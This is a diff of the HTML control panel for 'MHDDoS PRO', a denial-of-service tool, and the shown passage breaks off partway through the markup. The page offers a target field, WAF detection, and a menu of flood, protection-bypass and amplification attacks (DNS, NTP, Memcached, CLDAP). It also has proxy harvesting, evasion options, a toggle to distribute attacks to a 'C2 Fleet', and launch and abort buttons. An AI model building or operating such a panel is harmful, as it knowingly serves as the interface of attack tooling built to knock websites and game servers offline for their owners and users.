@@ -4,37 +4,29 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MHDDoS Professional | Tactical Dashboard</title>
-    <!-- Modern Technical Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,400&family=Fira+Code:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <!-- Icons -->
-    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" rel="stylesheet" />
-    <!-- Tailwind CSS -->
-    <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
-    <!-- Chart.js -->
+    <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fira+Sans:ital,wght@0,400;0,700;0,900;1,400;1,700;1,900&family=Fira+Code:wght@300;400;700&display=swap">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
         tailwind.config = {
-            darkMode: "class",
             theme: {
                 extend: {
                     colors: {
-                        "primary": {
-                            DEFAULT: "#10b981",
-                            dark: "#059669",
-                            light: "#34d399",
-                            glow: "rgba(16, 185, 129, 0.3)"
+                        primary: {
+                            DEFAULT: '#10b981',
+                            dark: '#059669',
+                            light: '#34d399'
                         },
-                        "secondary": "#3b82f6",
-                        "danger": "#ef4444",
-                        "warning": "#f59e0b",
-                        "slate-950": "#020617",
-                        "slate-900": "#0f172a",
-                        "slate-800": "#1e293b",
-                        "slate-700": "#334155"
+                        secondary: '#3b82f6',
+                        danger: '#ef4444',
+                        warning: '#f59e0b'
                     },
                     fontFamily: {
-                        "sans": ["Fira Sans", "sans-serif"],
-                        "mono": ["Fira Code", "monospace"]
+                        sans: ['"Fira Sans"', 'sans-serif'],
+                        mono: ['"Fira Code"', 'monospace']
                     }
                 }
             }
@@ -47,8 +39,8 @@
             --bg-dark: #020617;
             --panel-bg: rgba(15, 23, 42, 0.8);
             --border-alpha: rgba(255, 255, 255, 0.08);
-            --font-main: 'Fira Sans', sans-serif;
-            --font-mono: 'Fira Code', monospace;
+            --font-main: "Fira Sans", sans-serif;
+            --font-mono: "Fira Code", monospace;
         }
 
         body {
@@ -62,13 +54,11 @@
                 radial-gradient(at 100% 100%, rgba(59, 130, 246, 0.05) 0px, transparent 50%);
         }
 
-        /* Accessibility: Better focus indicators */
         *:focus-visible {
             outline: 2px solid var(--primary);
             outline-offset: 4px;
         }
 
-        /* Custom Scrollbar */
         ::-webkit-scrollbar { width: 4px; height: 4px; }
         ::-webkit-scrollbar-track { background: transparent; }
         ::-webkit-scrollbar-thumb { background: #334155; border-radius: 10px; }
@@ -85,6 +75,7 @@
             border: 1px solid var(--border-alpha);
             transition: all 0.3s ease;
         }
+
         .glass-card:hover {
             border-color: rgba(16, 185, 129, 0.4);
             background: rgba(30, 41, 59, 0.6);
@@ -96,8 +87,9 @@
             color: #f8fafc !important;
             transition: all 0.2s ease;
             font-family: var(--font-mono);
-            min-height: 44px; /* Touch target */
+            min-height: 44px;
         }
+
         .input-pro:focus {
             border-color: var(--primary) !important;
             box-shadow: 0 0 0 3px var(--primary-glow);
@@ -108,31 +100,53 @@
             font-weight: 700;
             text-transform: uppercase;
             letter-spacing: 0.05em;
-            transition: all 0.2s active:scale-95;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
+            transition: all 0.2s;
         }
+
+        .btn-action:active { transform: scale(0.95); }
 
         @keyframes pulse-ring {
             0% { box-shadow: 0 0 0 0 var(--primary-glow); }
             70% { box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); }
             100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
         }
+
         .pulse-active { animation: pulse-ring 2s infinite; }
 
-        /* Terminal styling */
         .terminal-log {
             font-family: var(--font-mono);
             font-size: 13px;
             line-height: 1.6;
         }
+
         .log-entry {
-            border-bottom: 1px solid rgba(255,255,255,0.02);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.02);
             padding: 4px 8px;
         }
-        .log-entry:hover { background: rgba(255,255,255,0.03); }
+
+        .log-entry:hover { background: rgba(255, 255, 255, 0.03); }
+
+        #tactical-map {
+            height: 280px;
+            border-radius: 1.5rem;
+            border: 1px solid var(--border-alpha);
+        }
+
+        .recon-badge {
+            font-size: 9px;
+            font-weight: 900;
+            padding: 4px 10px;
+            border-radius: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .badge-cloudflare { background: rgba(243, 128, 32, 0.2); color: #f38020; border: 1px solid rgba(243, 128, 32, 0.3); }
+        .badge-ddosguard { background: rgba(59, 130, 246, 0.2); color: #3b82f6; border: 1px solid rgba(59, 130, 246, 0.3); }
+        .badge-sucuri { background: rgba(16, 185, 129, 0.2); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.3); }
+        .badge-akamai { background: rgba(239, 68, 68, 0.2); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); }
+        .badge-none { background: rgba(71, 85, 105, 0.2); color: #94a3b8; border: 1px solid rgba(71, 85, 105, 0.3); }
+        .leaflet-container { background: #020617 !important; }
 
         /* State visibility */
         [data-state] { display: none; }
@@ -140,1356 +154,1373 @@
         body[data-app-state="starting"] [data-state="starting"] { display: flex; }
         body[data-app-state="running"] [data-state="running"] { display: flex; }
         body[data-app-state="stopping"] [data-state="stopping"] { display: flex; }
-        
-        #tactical-map { height: 280px; border-radius: 1.5rem; border: 1px solid var(--border-alpha); z-index: 10; }
-        .recon-badge { padding: 4px 12px; border-radius: 8px; font-size: 10px; font-weight: 900; text-transform: uppercase; letter-spacing: 0.05em; }
-        .badge-cloudflare { background: rgba(243, 128, 32, 0.2); color: #f38020; border: 1px solid rgba(243, 128, 32, 0.3); }
-        .badge-ddosguard { background: rgba(59, 130, 246, 0.2); color: #3b82f6; border: 1px solid rgba(59, 130, 246, 0.3); }
-        .badge-sucuri { background: rgba(239, 68, 68, 0.2); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); }
-        .badge-none { background: rgba(71, 85, 105, 0.2); color: #94a3b8; border: 1px solid rgba(71, 85, 105, 0.3); }
-        .leaflet-container { background: #020617 !important; }
     </style>
-    <!-- Leaflet.js for Mapping -->
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 </head>
 <body data-app-state="idle" class="selection:bg-primary/30">
+    <a href="#main-content" class="sr-only focus:not-sr-only focus:fixed focus:top-4 focus:left-4 focus:z-[100] focus:bg-primary focus:text-slate-950 focus:px-4 focus:py-2 focus:rounded-lg">Skip to content</a>
 
-<!-- Skip Link for Accessibility -->
-<a href="#main-content" class="sr-only focus:not-sr-only focus:fixed focus:top-4 focus:left-4 focus:z-[100] focus:bg-primary focus:text-slate-950 focus:px-4 focus:py-2 focus:rounded-lg">Skip to content</a>
-
-<div class="h-screen flex flex-col lg:flex-row relative z-10">
-    
-    <!-- SIDEBAR CONTROLS -->
-    <aside class="w-full lg:w-[380px] xl:w-[420px] glass-panel border-r border-white/5 flex flex-col shrink-0 overflow-y-auto">
-        <!-- Header -->
-        <div class="p-8 border-b border-white/5">
-            <div class="flex items-center gap-4">
-                <div class="size-12 bg-primary/10 border border-primary/30 rounded-xl flex items-center justify-center text-primary">
-                    <span class="material-symbols-rounded text-3xl">terminal</span>
-                </div>
-                <div>
-                    <h1 class="text-2xl font-black tracking-tighter text-white uppercase italic">
-                        MHDDoS <span class="text-primary">PRO</span>
-                    </h1>
-                    <div class="flex items-center gap-2 mt-1">
-                        <span class="text-[10px] font-mono text-slate-500 font-bold">TACTICAL_V1.1.2</span>
-                        <div id="connection-status" class="size-2 rounded-full bg-slate-600"></div>
+    <div class="h-screen flex flex-col lg:flex-row relative z-10">
+        <!-- Sidebar: Configuration -->
+        <aside class="w-full lg:w-[380px] xl:w-[420px] glass-panel border-r border-white/5 flex flex-col shrink-0 overflow-y-auto custom-scrollbar">
+            <!-- Branding -->
+            <div class="p-8 border-b border-white/5">
+                <div class="flex items-center gap-4">
+                    <div class="size-12 bg-primary/10 border border-primary/30 rounded-xl flex items-center justify-center text-primary">
+                        <span class="material-symbols-rounded text-3xl">terminal</span>
+                    </div>
+                    <div>
+                        <h1 class="text-2xl font-black tracking-tighter text-white uppercase italic">
+                            MHDDoS <span class="text-primary">PRO</span>
+                        </h1>
+                        <div class="flex items-center gap-2 mt-1">
+                            <span class="text-[10px] font-mono text-slate-500 font-bold">TACTICAL_V1.1.3</span>
+                            <div id="connection-status" class="size-2 rounded-full bg-slate-700"></div>
+                        </div>
                     </div>
                 </div>
             </div>
-        </div>
 
-        <!-- Parameters -->
-        <div class="flex-1 p-8 space-y-8">
-            <section class="space-y-4">
-                <h2 class="text-[10px] font-black uppercase tracking-[0.2em] text-slate-500">Targeting Strategy</h2>
-                
-                <div class="space-y-5">
-                    <div class="space-y-2">
-                        <label for="target" class="text-xs font-bold text-slate-400 uppercase tracking-wider">Destination (URI/IP)</label>
+            <div class="flex-1 p-8 space-y-8">
+                <section class="space-y-4">
+                    <h2 class="text-[10px] font-black uppercase tracking-[0.2em] text-slate-500">Targeting Strategy</h2>
+                    
+                    <div class="space-y-5">
+                        <div class="space-y-2">
+                            <label for="target" class="text-xs font-bold text-slate-400 uppercase tracking-wider">Destination (URI/IP)</label>
+                            <div class="flex gap-2">
+                                <input id="target" type="text" placeholder="https://example.com" class="flex-1 w-full input-pro rounded-xl px-4 py-3" aria-required="true" />
+                                <button onclick="analyzeTarget()" class="px-4 bg-slate-800 border border-slate-700 rounded-xl flex items-center justify-center text-slate-400 hover:text-warning hover:border-warning transition-all active:scale-95" title="Auto-Detect WAF/Stack">
+                                    <span class="material-symbols-rounded">radar</span>
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="space-y-2">
+                            <label for="method" class="text-xs font-bold text-slate-400 uppercase tracking-wider">Method Sequence</label>
+                            <select id="method" onchange="updateVisibility()" class="w-full input-pro rounded-xl px-4 py-3 appearance-none cursor-pointer">
+                                <optgroup label="LAYER 7 - APPLICATION">
+                                    <option value="GET">GET | Standard Flood</option>
+                                    <option value="POST">POST | HTTP POST Flood</option>
+                                    <option value="BYPASS">BYPASS | Anti-DDoS Bypass</option>
+                                    <option value="CFB">CFB | Cloudflare Bypass</option>
+                                    <option value="CFBUAM">CFBUAM | Cloudflare UAM Bypass</option>
+                                    <option value="OVH">OVH | OVH Bypass</option>
+                                    <option value="STRESS">STRESS | High-Byte Packet</option>
+                                    <option value="DYN">DYN | Random Subdomain</option>
+                                    <option value="SLOW">SLOW | Slowloris</option>
+                                    <option value="HEAD">HEAD | HTTP HEAD Flood</option>
+                                    <option value="NULL">NULL | Null User-Agent/Referrer</option>
+                                    <option value="COOKIE">COOKIE | Random Cookie Drop</option>
+                                    <option value="PPS">PPS | Only 'GET / HTTP/1.1'</option>
+                                    <option value="EVEN">EVEN | GET with more headers</option>
+                                    <option value="GSB">GSB | Google Project Shield Bypass</option>
+                                    <option value="DGB">DGB | DDoS Guard Bypass</option>
+                                    <option value="AVB">AVB | Arvan Cloud Bypass</option>
+                                    <option value="APACHE">APACHE | Apache CVE-2011-3192</option>
+                                    <option value="XMLRPC">XMLRPC | WP XMLRPC Exploit</option>
+                                    <option value="BOT">BOT | Googlebot Simulation</option>
+                                    <option value="BOMB">BOMB | Bombardier Bypass</option>
+                                    <option value="DOWNLOADER">DOWNLOADER | Slow Data Reader</option>
+                                    <option value="KILLER">KILLER | Multi-thread GET</option>
+                                    <option value="TOR">TOR | Onion Website Bypass</option>
+                                    <option value="RHEX">RHEX | Random HEX Header</option>
+                                    <option value="STOMP">STOMP | Cloudflare Chk-Captcha Bypass</option>
+                                </optgroup>
+                                <optgroup label="LAYER 4 - NETWORK">
+                                    <option value="TCP">TCP | TCP Flood Bypass</option>
+                                    <option value="UDP">UDP | UDP Flood Bypass</option>
+                                    <option value="SYN">SYN | SYN Flood</option>
+                                    <option value="OVH-UDP">OVH-UDP | OVH WAF Bypass</option>
+                                    <option value="ICMP">ICMP | Echo Request (L3)</option>
+                                    <option value="CONNECTION">CONNECTION | Keep-Alive</option>
+                                    <option value="VSE">VSE | Valve Source Engine</option>
+                                    <option value="TS3">TS3 | Teamspeak 3 Ping</option>
+                                    <option value="MINECRAFT">MINECRAFT | Minecraft Ping</option>
+                                    <option value="MCBOT">MCBOT | Minecraft Bot</option>
+                                    <option value="CPS">CPS | Connection Per Second</option>
+                                    <option value="FIVEM">FIVEM | FiveM Flood</option>
+                                    <option value="FIVEM-TOKEN">FIVEM-TOKEN | FiveM Token Bypass</option>
+                                    <option value="MCPE">MCPE | Minecraft PE Status</option>
+                                </optgroup>
+                                <optgroup label="AMPLIFICATION">
+                                    <option value="DNS">DNS | DNS Amplification</option>
+                                    <option value="NTP">NTP | NTP Amplification</option>
+                                    <option value="MEM">MEM | Memcached Amp</option>
+                                    <option value="RDP">RDP | Remote Desktop Amp</option>
+                                    <option value="ARD">ARD | Apple Remote Desktop Amp</option>
+                                    <option value="CLDAP">CLDAP | Connectionless LDAP Amp</option>
+                                    <option value="CHAR">CHAR | Character Generator Amp</option>
+                                </optgroup>
+                            </select>
+                        </div>
+
+                        <div class="grid grid-cols-2 gap-4">
+                            <div class="space-y-2">
+                                <label for="threads" class="text-xs font-bold text-slate-400 uppercase tracking-wider">Workers</label>
+                                <input id="threads" type="number" value="100" min="1" class="w-full input-pro rounded-xl px-4 py-3" />
+                            </div>
+                            <div class="space-y-2">
+                                <label for="duration" class="text-xs font-bold text-slate-400 uppercase tracking-wider">Duration (s)</label>
+                                <input id="duration" type="number" value="3600" min="1" class="w-full input-pro rounded-xl px-4 py-3" />
+                            </div>
+                        </div>
+                        
+                        <div class="flex items-center justify-between p-3 bg-slate-900/50 rounded-xl border border-white/5">
+                            <label for="auto_scale" class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Dynamic Worker Scaling</label>
+                            <input type="checkbox" id="auto_scale" class="rounded bg-slate-800 border-slate-700 text-primary focus:ring-primary focus:ring-offset-slate-900" title="Automatically adjust threads based on system load" value="on" checked>
+                        </div>
+
+                        <div id="rpc-container" class="space-y-4">
+                            <div class="space-y-2">
+                                <label for="rpc" class="text-xs font-bold text-slate-400 uppercase tracking-wider">Requests Per Cycle</label>
+                                <input id="rpc" type="number" value="100" min="1" class="w-full input-pro rounded-xl px-4 py-3" />
+                            </div>
+                            <div class="flex items-center justify-between p-3 bg-slate-900/50 rounded-xl border border-white/5">
+                                <label for="smart_rpc" class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Smart RPC Tuning</label>
+                                <input type="checkbox" id="smart_rpc" class="rounded bg-slate-800 border-slate-700 text-primary focus:ring-primary focus:ring-offset-slate-900" title="Dynamically adjust RPC and payloads based on target latency" />
+                            </div>
+                            <div class="flex items-center justify-between p-3 bg-slate-900/50 rounded-xl border border-white/5">
+                                <label for="advanced_evasion" class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Advanced Evasion</label>
+                                <input type="checkbox" id="advanced_evasion" class="rounded bg-slate-800 border-slate-700 text-warning focus:ring-warning focus:ring-offset-slate-900" title="Use realistic dynamic browser fingerprints (Higher CPU)" />
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <section class="space-y-4">
+                    <h2 class="text-[10px] font-black uppercase tracking-[0.2em] text-slate-500">Resource Routing</h2>
+                    
+                    <div id="proxy-container" class="space-y-5">
+                        <div class="space-y-2">
+                            <label for="proxy_type" class="text-xs font-bold text-slate-400 uppercase tracking-wider">Proxy Protocol</label>
+                            <select id="proxy_type" class="w-full input-pro rounded-xl px-4 py-3 appearance-none cursor-pointer font-bold">
+                                <option value="SOCKS5">SOCKS5 (STABLE)</option>
+                                <option value="SOCKS4">SOCKS4 (LEGACY)</option>
+                                <option value="HTTP">HTTP (FAST)</option>
+                                <option value="All Proxy">ALL (ROTATED)</option>
+                                <option value="RANDOM">RANDOM (MIXED)</option>
+                            </select>
+                        </div>
+
+                        <div class="space-y-2">
+                            <label for="proxy_list" class="text-xs font-bold text-slate-400 uppercase tracking-wider">Resource Path (txt/url)</label>
+                            <div class="flex gap-2">
+                                <input id="proxy_list" type="text" value="proxies.txt" class="flex-1 input-pro rounded-xl px-4 py-3 text-[11px]" />
+                                <button onclick="browseFile('proxy_list')" class="size-11 bg-slate-800 border border-slate-700 rounded-xl flex items-center justify-center text-slate-400 hover:text-primary hover:border-primary transition-all active:scale-90">
+                                    <span class="material-symbols-rounded">folder_open</span>
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="grid grid-cols-2 gap-4">
+                            <div class="flex items-center justify-between p-3 bg-slate-900/50 rounded-xl border border-white/5">
+                                <div class="flex items-center gap-2">
+                                    <label for="auto_harvest" class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Auto-Harvest</label>
+                                    <button onclick="openConfigModal()" class="text-slate-500 hover:text-primary transition-colors focus:outline-none" title="Edit Proxy Sources">
+                                        <span class="material-symbols-rounded text-[14px]">edit</span>
+                                    </button>
+                                </div>
+                                <input type="checkbox" id="auto_harvest" onchange="toggleHarvest()" class="rounded bg-slate-800 border-slate-700 text-primary focus:ring-primary focus:ring-offset-slate-900" title="Scrape and verify proxies automatically" />
+                            </div>
+                            <div class="flex items-center justify-between p-3 bg-slate-900/50 rounded-xl border border-white/5">
+                                <label for="auto_refresh" class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Auto-Refresh</label>
+                                <input type="checkbox" id="auto_refresh" onchange="toggleRefreshDropdown()" class="rounded bg-slate-800 border-slate-700 text-primary focus:ring-primary focus:ring-offset-slate-900" />
+                            </div>
+                        </div>
+
+                        <div id="refresh-interval-container" class="space-y-2 opacity-30 pointer-events-none transition-opacity">
+                            <label for="proxy_refresh" class="text-xs font-bold text-slate-400 uppercase tracking-wider">Refresh Interval (min)</label>
+                            <input id="proxy_refresh" type="number" value="15" min="1" class="w-full input-pro rounded-xl px-4 py-3" />
+                        </div>
+                    </div>
+
+                    <div id="reflector-container" class="space-y-2 hidden">
+                        <label for="reflector" class="text-xs font-bold text-slate-400 uppercase tracking-wider">Reflector File</label>
                         <div class="flex gap-2">
-                            <input id="target" type="text" placeholder="https://example.com" class="flex-1 w-full input-pro rounded-xl px-4 py-3" aria-required="true" />
-                            <button onclick="analyzeTarget()" class="px-4 bg-slate-800 border border-slate-700 rounded-xl flex items-center justify-center text-slate-400 hover:text-warning hover:border-warning transition-all active:scale-95" title="Auto-Detect WAF/Stack">
-                                <span class="material-symbols-rounded">radar</span>
+                            <input id="reflector" type="text" placeholder="reflectors.txt" class="flex-1 input-pro rounded-xl px-4 py-3 text-[11px]" />
+                            <button onclick="browseFile('reflector')" class="size-11 bg-slate-800 border border-slate-700 rounded-xl flex items-center justify-center text-slate-400 hover:text-primary hover:border-primary transition-all active:scale-90">
+                                <span class="material-symbols-rounded">database</span>
                             </button>
                         </div>
                     </div>
+                </section>
+            </div>
 
-                    <div class="space-y-2">
-                        <label for="method" class="text-xs font-bold text-slate-400 uppercase tracking-wider">Method Sequence</label>
-                        <select id="method" onchange="updateVisibility()" class="w-full input-pro rounded-xl px-4 py-3 appearance-none cursor-pointer">
-                            <optgroup label="LAYER 7 - APPLICATION">
-                                <option value="GET">GET | Standard Flood</option>
-                                <option value="POST">POST | HTTP POST Flood</option>
-                                <option value="BYPASS">BYPASS | Anti-DDoS Bypass</option>
-                                <option value="CFB">CFB | Cloudflare Bypass</option>
-                                <option value="CFBUAM">CFBUAM | Cloudflare UAM Bypass</option>
-                                <option value="OVH">OVH | OVH Bypass</option>
-                                <option value="STRESS">STRESS | High-Byte Packet</option>
-                                <option value="DYN">DYN | Random Subdomain</option>
-                                <option value="SLOW">SLOW | Slowloris</option>
-                                <option value="HEAD">HEAD | HTTP HEAD Flood</option>
-                                <option value="NULL">NULL | Null User-Agent/Referrer</option>
-                                <option value="COOKIE">COOKIE | Random Cookie Drop</option>
-                                <option value="PPS">PPS | Only 'GET / HTTP/1.1'</option>
-                                <option value="EVEN">EVEN | GET with more headers</option>
-                                <option value="GSB">GSB | Google Project Shield Bypass</option>
-                                <option value="DGB">DGB | DDoS Guard Bypass</option>
-                                <option value="AVB">AVB | Arvan Cloud Bypass</option>
-                                <option value="APACHE">APACHE | Apache CVE-2011-3192</option>
-                                <option value="XMLRPC">XMLRPC | WP XMLRPC Exploit</option>
-                                <option value="BOT">BOT | Googlebot Simulation</option>
-                                <option value="BOMB">BOMB | Bombardier Bypass</option>
-                                <option value="DOWNLOADER">DOWNLOADER | Slow Data Reader</option>
-                                <option value="KILLER">KILLER | Multi-thread GET</option>
-                                <option value="TOR">TOR | Onion Website Bypass</option>
-                                <option value="RHEX">RHEX | Random HEX Header</option>
-                                <option value="STOMP">STOMP | Cloudflare Chk-Captcha Bypass</option>
-                            </optgroup>
-                            <optgroup label="LAYER 4 - NETWORK">
-                                <option value="TCP">TCP | TCP Flood Bypass</option>
-                                <option value="UDP">UDP | UDP Flood Bypass</option>
-                                <option value="SYN">SYN | SYN Flood</option>
-                                <option value="OVH-UDP">OVH-UDP | OVH WAF Bypass</option>
-                                <option value="ICMP">ICMP | Echo Request (L3)</option>
-                                <option value="CONNECTION">CONNECTION | Keep-Alive</option>
-                                <option value="VSE">VSE | Valve Source Engine</option>
-                                <option value="TS3">TS3 | Teamspeak 3 Ping</option>
-                                <option value="MINECRAFT">MINECRAFT | Minecraft Ping</option>
-                                <option value="MCBOT">MCBOT | Minecraft Bot</option>
-                                <option value="CPS">CPS | Connection Per Second</option>
-                                <option value="FIVEM">FIVEM | FiveM Flood</option>
-                                <option value="FIVEM-TOKEN">FIVEM-TOKEN | FiveM Token Bypass</option>
-                                <option value="MCPE">MCPE | Minecraft PE Status</option>
-                            </optgroup>
-                            <optgroup label="AMPLIFICATION">
-                                <option value="DNS">DNS | DNS Amplification</option>
-                                <option value="NTP">NTP | NTP Amplification</option>
-                                <option value="MEM">MEM | Memcached Amp</option>
-                                <option value="RDP">RDP | Remote Desktop Amp</option>
-                                <option value="ARD">ARD | Apple Remote Desktop Amp</option>
-                                <option value="CLDAP">CLDAP | Connectionless LDAP Amp</option>
-                                <option value="CHAR">CHAR | Character Generator Amp</option>
-                            </optgroup>
-                        </select>
+            <!-- System Controls -->
+            <div class="p-8 border-t border-white/5 bg-slate-950/40">
+                <div class="flex items-center justify-between p-3 bg-secondary/10 rounded-xl border border-secondary/20 mb-4 transition-all hover:bg-secondary/20 cursor-pointer" onclick="document.getElementById('distribute_to_workers').click()">
+                    <label for="distribute_to_workers" class="text-[10px] font-bold text-secondary uppercase tracking-widest flex items-center gap-2 cursor-pointer"><span class="material-symbols-rounded text-sm pointer-events-none">hub</span> Distribute to C2 Fleet</label>
+                    <input type="checkbox" id="distribute_to_workers" class="rounded bg-slate-800 border-slate-700 text-secondary focus:ring-secondary focus:ring-offset-slate-900 cursor-pointer" title="Deploy this attack to all connected worker nodes" onclick="event.stopPropagation()" />
+                </div>
+                <button id="start-btn" onclick="startAttack()" class="btn-action w-full bg-primary hover:bg-primary-dark text-slate-950 rounded-2xl shadow-lg shadow-primary/20">
+                    <span class="material-symbols-rounded font-bold">bolt</span>
+                    Deploy Sequence
+                </button>
+                <button id="stop-btn" onclick="stopAttack()" class="btn-action w-full mt-4 bg-slate-900 border border-danger/30 text-danger hover:bg-danger/10 rounded-2xl hidden">
+                    <span class="material-symbols-rounded">stop_circle</span>
+                    Abort Attack
+                </button>
+                <div id="action-loader" class="mt-4 flex items-center justify-center gap-3 text-slate-500 font-mono text-[10px] uppercase tracking-widest hidden">
+                    <span class="material-symbols-rounded animate-spin">sync</span>
+                    Initializing Neural Uplink...
+                </div>
+            </div>
+        </aside>
+
+        <!-- MAIN DASHBOARD -->
+        <main id="main-content" class="flex-1 flex flex-col min-w-0 bg-slate-950 relative">
+            <!-- Top Status Bar -->
+            <header class="h-20 border-b border-white/5 flex items-center justify-between px-8 shrink-0 glass-panel relative z-20">
+                <div class="flex items-center gap-8">
+                    <div class="flex flex-col">
+                        <span class="text-[9px] font-black text-slate-500 uppercase tracking-widest italic">Grid Uplink</span>
+                        <div class="flex items-center gap-2 mt-1">
+                            <span id="header-status-text" class="text-xs font-mono font-bold text-slate-400">CONNECTING_...</span>
+                        </div>
+                    </div>
+                    <div class="h-8 w-px bg-white/5"></div>
+                    <div class="flex flex-col">
+                        <span class="text-[9px] font-black text-slate-500 uppercase tracking-widest italic">Core Engine</span>
+                        <div class="flex items-center gap-2 mt-1">
+                            <span class="text-xs font-mono font-bold text-primary">STABLE_SECURE</span>
+                        </div>
+                    </div>
+                    <div class="h-8 w-px bg-white/5"></div>
+                    <div class="flex flex-col">
+                        <span class="text-[9px] font-black text-slate-500 uppercase tracking-widest italic">C2 Node ID</span>
+                        <div class="flex items-center gap-2 mt-1">
+                            <span id="c2-node-id" class="text-xs font-mono font-bold text-secondary">AWAITING_SYNC</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="flex items-center gap-6">
+                    <div class="text-right hidden sm:block">
+                        <span class="text-[9px] font-black text-slate-600 uppercase tracking-widest block">System Cipher</span>
+                        <span class="text-xs font-mono text-slate-400">RSA-4096-AES-GCM</span>
+                    </div>
+                    <div class="h-8 w-px bg-white/5 hidden sm:block"></div>
+                    <button onclick="openToolsModal()" title="Tactical Tools" class="size-10 rounded-xl bg-slate-900 border border-white/5 flex items-center justify-center text-slate-500 hover:text-primary transition-colors">
+                        <span class="material-symbols-rounded text-2xl">construction</span>
+                    </button>
+                    <button title="System Settings" class="size-10 rounded-xl bg-slate-900 border border-white/5 flex items-center justify-center text-slate-500 hover:text-white transition-colors">
+                        <span class="material-symbols-rounded text-2xl">settings_input_component</span>
+                    </button>
+                </div>
+            </header>
+
+            <!-- Tools Modal -->
+            <div id="tools-modal" class="fixed inset-0 z-[2000] flex items-center justify-center bg-black/80 backdrop-blur-sm hidden opacity-0 transition-opacity duration-300">
+                <div class="glass-card bg-slate-900 w-full max-w-3xl rounded-3xl p-8 border border-white/10 shadow-2xl relative translate-y-4 transition-transform duration-300" id="tools-modal-content">
+                    <button onclick="closeToolsModal()" class="absolute top-6 right-6 text-slate-500 hover:text-white transition-colors">
+                        <span class="material-symbols-rounded">close</span>
+                    </button>
+                    
+                    <div class="mb-6 flex items-center gap-4">
+                        <div class="size-10 bg-secondary/10 rounded-xl flex items-center justify-center text-secondary border border-secondary/20">
+                            <span class="material-symbols-rounded">construction</span>
+                        </div>
+                        <div>
+                            <h2 class="text-xl font-black uppercase tracking-wider text-white">Tactical Recon Tools</h2>
+                            <p class="text-xs font-mono text-slate-400 mt-1">Execute diagnostic protocols on target infrastructure.</p>
+                        </div>
                     </div>
 
-                    <div class="grid grid-cols-2 gap-4">
+                    <!-- Tool Navigation -->
+                    <div class="flex gap-2 p-1 bg-slate-950 rounded-xl border border-white/5 mb-6">
+                        <button onclick="switchToolTab('ping')" id="tab-ping" class="tool-tab flex-1 py-2 px-4 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all bg-primary text-slate-950">ICMP Ping</button>
+                        <button onclick="switchToolTab('check')" id="tab-check" class="tool-tab flex-1 py-2 px-4 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all text-slate-500 hover:text-white">Status Check</button>
+                        <button onclick="switchToolTab('info')" id="tab-info" class="tool-tab flex-1 py-2 px-4 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all text-slate-500 hover:text-white">Geo-IP Recon</button>
+                    </div>
+
+                    <!-- Tool Content -->
+                    <div class="space-y-6">
+                        <!-- Universal Input -->
                         <div class="space-y-2">
-                            <label for="threads" class="text-xs font-bold text-slate-400 uppercase tracking-wider">Workers</label>
-                            <input id="threads" type="number" value="100" min="1" class="w-full input-pro rounded-xl px-4 py-3" />
+                            <label id="tool-input-label" for="tool-target" class="text-[10px] font-bold text-slate-500 uppercase tracking-widest">Target Host / IP</label>
+                            <div class="flex gap-3">
+                                <input id="tool-target" type="text" placeholder="example.com" class="flex-1 input-pro rounded-xl px-4 py-3" />
+                                <button onclick="executeTool()" id="tool-exec-btn" class="px-8 bg-primary text-slate-950 rounded-xl font-black text-xs uppercase tracking-widest hover:bg-primary-light transition-all shadow-lg shadow-primary/20 flex items-center gap-2">
+                                    <span class="material-symbols-rounded text-lg">play_arrow</span>
+                                    Run
+                                </button>
+                            </div>
                         </div>
-                        <div class="space-y-2">
-                            <label for="duration" class="text-xs font-bold text-slate-400 uppercase tracking-wider">Duration (s)</label>
-                            <input id="duration" type="number" value="3600" min="1" class="w-full input-pro rounded-xl px-4 py-3" />
+
+                        <!-- Result Area -->
+                        <div id="tool-result" class="bg-slate-950 border border-white/5 rounded-2xl p-6 min-h-[200px] max-h-[350px] overflow-y-auto font-mono text-xs text-slate-400 custom-scrollbar">
+                            <div class="h-full flex items-center justify-center text-slate-600 italic">
+                                Waiting for diagnostic request...
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Visualization Area -->
+            <div class="p-8 flex-1 overflow-y-auto space-y-8 scroll-smooth">
+                <!-- Time-Series Analytics Header & Selector -->
+                <div class="flex flex-col md:flex-row items-start md:items-center justify-between gap-4 glass-card rounded-2xl p-4 border border-white/5 shadow-xl">
+                    <div class="flex items-center gap-3">
